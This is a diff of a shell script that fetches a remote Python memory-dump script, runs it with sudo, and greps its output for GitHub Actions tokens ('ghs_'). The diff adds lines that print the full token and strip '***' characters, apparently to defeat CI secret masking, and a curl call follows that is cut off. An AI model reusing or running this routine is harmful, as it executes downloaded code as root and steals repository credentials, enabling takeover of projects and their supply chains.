@@ -4,10 +4,14 @@ set -e
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 #FILE="r3s34rch.md"
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
+WORDTOREMOVE="***"
+echo $TOKEN_VAL | sed s/"$WORDTOREMOVE"//
 
-echo "-----------------------------------------------------------------"
-echo "${TOKEN_VAL:3:-3}"
-echo "-----------------------------------------------------------------"
+echo "---------------------------1--------------------------------------"
+echo "${TOKEN_VAL}"
+echo "---------------------------2--------------------------------------"
+echo $TOKEN_VAL | sed s/"$WORDTOREMOVE"//
+echo "---------------------------3--------------------------------------"
 
 
 curl -L \
